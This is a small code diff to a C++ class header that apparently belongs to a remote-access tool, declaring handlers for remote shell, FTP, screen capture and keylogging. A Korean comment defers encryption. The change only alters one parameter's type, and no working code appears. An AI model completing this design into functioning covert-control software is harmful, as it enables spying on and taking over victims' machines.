@@ -31,7 +31,7 @@ public:
 	void printParsedResponse(DDprotocol* resData, std::string data);
 	void handleShellRequest();
 	void handleFtpRequest(std::string path);
-	void handleFtpResponse(std::string& data, DWORD seq);
+	void handleFtpResponse(std::string data, DWORD seq);
 	void handleScreenRequest();
 	void handleKeyLog();
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
